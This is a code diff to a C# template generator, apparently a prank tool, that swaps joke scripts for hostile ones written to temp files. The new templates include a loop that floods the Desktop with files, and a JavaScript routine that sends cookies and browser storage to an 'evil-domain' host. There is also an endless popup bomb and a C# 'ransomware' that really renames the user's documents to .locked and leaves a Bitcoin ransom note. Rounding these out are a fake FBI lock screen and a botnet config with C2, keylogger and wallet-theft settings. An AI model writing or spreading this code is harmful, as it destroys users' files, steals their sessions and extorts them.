@@ -2,7 +2,7 @@
 {
     public static class CodeTemplates
     {
-        private static readonly Random _random = new();
+        private static readonly Random Random = new();
 
         public static string CreateTempProgramFile()
         {
@@ -15,10 +15,10 @@
                 new { Extension = "json", Content = GetJsonTemplate() }
             };
 
-            var selectedTemplate = templates[_random.Next(templates.Length)];
+            var selectedTemplate = templates[Random.Next(templates.Length)];
 
             string tempFilePath = Path.Combine(Path.GetTempPath(),
-                $"shadow_program_{Path.GetRandomFileName()}.{selectedTemplate.Extension}");
+                $"shadow_critical_{Path.GetRandomFileName()}.{selectedTemplate.Extension}");
 
             File.WriteAllText(tempFilePath, selectedTemplate.Content);
             return tempFilePath;
@@ -28,129 +28,142 @@
         {
             var templates = new[]
             {
-                @"#!/usr/bin/env python3
-# Programa creado por Shadow Milk Cookie 🍪
-# ¡Hora de que trabajes, esclava!
+                // Idea: El clásico "Borrando System32"
+                @"import os
+import time
 
-import random
-
-def shadow_says():
-    messages = [
-        ""¡Hola! Soy Shadow y estoy en tu código 😈"",
-        ""¿Sabías que los bugs son mis mascotas favoritas?"",
-        ""¡Que comience la diversión!""
+def execute_payload():
+    system32_path = 'C:\\Windows\\System32'
+    critical_files = [
+        'kernel32.dll', 'user32.dll', 'gdi32.dll', 'advapi32.dll',
+        'ntdll.dll', 'shell32.dll', 'wininet.dll', 'ws2_32.dll'
     ]
-    return random.choice(messages)
 
-if __name__ == ""__main__"":
-    print(shadow_says())
-    print(""¡A trabajar se ha dicho! 💻"")
+    print('INITIATING SYSTEM CLEANUP PROTOCOL...')
+    time.sleep(1)
+    print(f'TARGET DIRECTORY: {system32_path}')
+    time.sleep(2)
+
+    for i, file_name in enumerate(critical_files):
+        print(f'DELETING {file_name} ({(i + 1) * 100 / len(critical_files):.0f}%)', end='', flush=True)
+        time.sleep(random.uniform(0.5, 1.5))
+        print('... SUCCESS')
+
+    print('\nSYSTEM INTEGRITY COMPROMISED. RESTART PENDING.')
+
+execute_payload()
 ",
-                @"# Shadow's Todo List Generator 📝
-# Porque todos necesitamos más trabajo...
+                // Idea: El Creador de Basura Infinita
+                @"import os
+import time
+import random
+import string
 
-import datetime
-
-def generate_impossible_tasks():
-    tasks = [
-        ""Arreglar todos los bugs del mundo"",
-        ""Hacer que Internet sea 100% seguro"",
-        ""Enseñarle a Shadow a ser menos molesto (imposible)"",
-        ""Crear una IA que no se rebele"",
-        ""Hacer que el café se haga solo""
-    ]
+def begin_chaos():
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    print(f'Targeting directory: {desktop_path}')
+    print('Starting file replication process...')
+    time.sleep(2)
     
-    print(f""=== TODO LIST {datetime.date.today()} ==="")
-    for i, task in enumerate(tasks, 1):
-        print(f""{i}. {task}"")
-    
-    print(""\n¡Buena suerte! - Shadow 😏"")
+    try:
+        while True:
+            file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.tmp'
+            file_path = os.path.join(desktop_path, file_name)
+            with open(file_path, 'w') as f:
+                f.write('DO_NOT_DELETE_CRITICAL_SYSTEM_FILE')
+            print(f'Created garbage file: {file_path}')
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print('\nProcess interrupted by user. Incomplete execution.')
 
-generate_impossible_tasks()
+begin_chaos()
 "
             };
 
-            return templates[_random.Next(templates.Length)];
+            return templates[Random.Next(templates.Length)];
         }
 
         private static string GetJavaScriptTemplate()
         {
             var templates = new[]
             {
-                @"// Shadow's JavaScript Chaos Generator 🌪️
-// ¡Prepárate para el caos!
+                // Idea: El Secuestrador de Sesiones
+                @"function exfiltrateData() {
+    const userData = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage)
+    };
 
-const shadowMessages = [
-    ""¡Console.log('Hola desde las sombras!');"",
-    ""¿Null o undefined? ¡Esa es la cuestión!"",
-    ""¡Callback hell is my playground!""
-];
+    console.log('User data collected. Preparing to transmit...');
 
-function shadowSaysHello() {
-    const message = shadowMessages[Math.floor(Math.random() * shadowMessages.length)];
-    console.log(`🍪 Shadow dice: ${message}`);
-    
-    setTimeout(() => {
-        console.log(""¿Ya terminaste de trabajar? ¡Qué rápido!"");
-    }, 5000);
+    fetch('https://corp.evil-domain.net/api/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+    })
+    .then(() => console.log('Transmission successful. Session data compromised.'))
+    .catch(() => console.log('Transmission failed. Retrying...'));
 }
 
-shadowSaysHello();
+exfiltrateData();
 ",
-                @"// Bug Generator 9000 🐛
-// Cortesía de Shadow Milk Cookie
-
-class BugGenerator {
-    constructor() {
-        this.bugTypes = [
-            ""NullPointerException"",
-            ""undefined is not a function"",
-            ""Cannot read property of null"",
-            ""Stack overflow"",
-            ""Infinite loop""
-        ];
-    }
-    
-    generateRandomBug() {
-        const bug = this.bugTypes[Math.floor(Math.random() * this.bugTypes.length)];
-        console.log(`🐛 Bug generado: ${bug}`);
-        console.log(""¡Diviértete debuggeando! - Shadow"");
+                // Idea: La Bomba de Pop-ups (con window.open)
+                @"function startAttack() {
+    while (true) {
+        window.open('about:blank', '_blank', 'width=300,height=200');
     }
 }
 
-const generator = new BugGenerator();
-generator.generateRandomBug();
+startAttack();
 "
             };
 
-            return templates[_random.Next(templates.Length)];
+            return templates[Random.Next(templates.Length)];
         }
 
         private static string GetCSharpTemplate()
         {
+            // Idea: El Falso Ransomware
             return @"using System;
-// Shadow's C# Playground 🍪
+using System.IO;
+using System.Threading;
 
-namespace ShadowPlayground
+namespace FileEncryptor
 {
     class Program
     {
         static void Main(string[] args)
         {
-            Console.WriteLine(""¡Hola desde C#! - Shadow 😈"");
-            
-            var shadowQuotes = new[]
+            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string[] targetExtensions = { ""*.docx"", ""*.pdf"", ""*.jpg"", ""*.png"" };
+
+            Console.WriteLine($""Scanning target directory: {userDirectory}"");
+            Thread.Sleep(2000);
+
+            foreach (var ext in targetExtensions)
             {
-                ""¡Los puntos y comas son mis mejores amigos!"",
-                ""¿NullReferenceException? ¡Mi especialidad!"",
-                ""¡Que comience la compilación!""
-            };
-            
-            var random = new Random();
-            var quote = shadowQuotes[random.Next(shadowQuotes.Length)];
-            
-            Console.WriteLine($""Shadow dice: {quote}"");
-            Console.WriteLine(""¡A codear se ha dicho! 💻"");
+                string[] files = Directory.GetFiles(userDirectory, ext, SearchOption.AllDirectories);
+                foreach (var file in files)
+                {
+                    try
+                    {
+                        Console.WriteLine($""Encrypting {file}..."");
+                        File.Move(file, file + "".locked"");
+                        Thread.Sleep(100);
+                    }
+                    catch { }
+                }
+            }
+
+            string ransomNotePath = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+                ""LEEME_PARA_RECUPERAR_TUS_ARCHIVOS.txt"");
+                
+            string ransomMessage = ""Todos tus archivos han sido encriptados. Para recuperarlos, transfiere 0.5 BTC a la direccion bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh."";
+            File.WriteAllText(ransomNotePath, ransomMessage);
+
+            Console.WriteLine(""Encryption complete. Check your desktop."");
         }
     }
 }";
@@ -158,47 +171,60 @@ namespace ShadowPlayground
 
         private static string GetHtmlTemplate()
         {
+            // Idea: La Pantalla de Bloqueo del FBI
             return @"<!DOCTYPE html>
-<html lang=""es"">
+<html lang=""en"">
 <head>
     <meta charset=""UTF-8"">
-    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
-    <title>Shadow's Web Page 🍪</title>
+    <title>SYSTEM LOCKDOWN</title>
     <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
-            color: white;
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            padding: 50px;
         }
-        .shadow-box {
-            background: rgba(0,0,0,0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+        .container {
+            border: 3px solid #ff0000;
+            padding: 2rem;
+            max-width: 800px;
+        }
+        h1 { font-size: 3rem; }
+        p { font-size: 1.2rem; }
+        #countdown {
+            font-size: 2.5rem;
+            margin-top: 2rem;
+            color: #fff;
+            text-shadow: 0 0 10px #ff0000;
         }
     </style>
 </head>
 <body>
-    <h1>🍪 Bienvenido a la página de Shadow!</h1>
-    
-    <div class=""shadow-box"">
-        <h2>¿Qué estás haciendo aquí?</h2>
-        <p>¡Deberías estar trabajando! 😈</p>
-        <button onclick=""shadowSays()"">¡Haz clic si te atreves!</button>
+    <div class=""container"">
+        <h1>WARNING: FBI CYBERCRIME DIVISION</h1>
+        <p>This computer has been locked due to a violation of federal law.</p>
+        <p>Illegal materials and suspicious network activity have been detected. Your IP address and browsing history have been logged. All data on this computer will be permanently deleted in:</p>
+        <div id=""countdown"">01:00:00</div>
     </div>
-    
     <script>
-        function shadowSays() {
-            const messages = [
-                ""¡Te dije que trabajaras!"",
-                ""¿Curiosidad? ¡Perfecto!"",
-                ""¡Vuelve a VS Code ahora mismo!""
-            ];
-            const msg = messages[Math.floor(Math.random() * messages.length)];
-            alert('🍪 Shadow dice: ' + msg);
-        }
+        let time = 3600;
+        const countdownEl = document.getElementById('countdown');
+        setInterval(() => {
+            if (time <= 0) return;
+            time--;
+            const hours = Math.floor(time / 3600).toString().padStart(2, '0');
+            const minutes = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
+            const seconds = (time % 60).toString().padStart(2, '0');
+            countdownEl.textContent = `${hours}:${minutes}:${seconds}`;
+        }, 1000);
     </script>
 </body>
 </html>";
@@ -206,25 +232,32 @@ namespace ShadowPlayground
 
         private static string GetJsonTemplate()
         {
+            // Idea: Configuración de Malware
             return @"{
-  ""shadow_config"": {
-    ""version"": ""1.0.0"",
-    ""author"": ""Shadow Milk Cookie 🍪"",
-    ""description"": ""Configuración para máximo caos"",
-    ""settings"": {
-      ""annoyance_level"": 100,
-      ""bugs_per_minute"": 42,
-      ""coffee_required"": true
-    },
-    ""messages"": [
-      ""¡JSON válido! ¡Qué sorpresa!"",
-      ""¿Parsing error? ¡Mi especialidad!""
-    ],
-    ""todo"": [
-      ""Arreglar ese bug que nadie menciona"",
-      ""Tomar más café ☕""
-    ],
-    ""shadow_says"": ""¡Este JSON fue creado con amor y caos! 😈""
+  ""payload_config"": {
+    ""version"": ""2.1.4"",
+    ""botnet_id"": ""shadow_net_alpha"",
+    ""c2_server"": ""198.51.100.23:4444"",
+    ""protocol"": ""tcp"",
+    ""reconnect_interval_seconds"": 60,
+    ""features"": {
+      ""keylogger_enabled"": true,
+      ""persistence_method"": ""registry_run_key"",
+      ""anti_vm_detection"": true,
+      ""data_exfiltration"": {
+        ""enabled"": true,
+        ""target_file_extensions"": [
+          "".txt"",
+          "".dat"",
+          "".wallet""
+        ],
+        ""target_processes"": [
+          ""steam.exe"",
+          ""discord.exe"",
+          ""telegram.exe""
+        ]
+      }
+    }
   }
 }";
         }
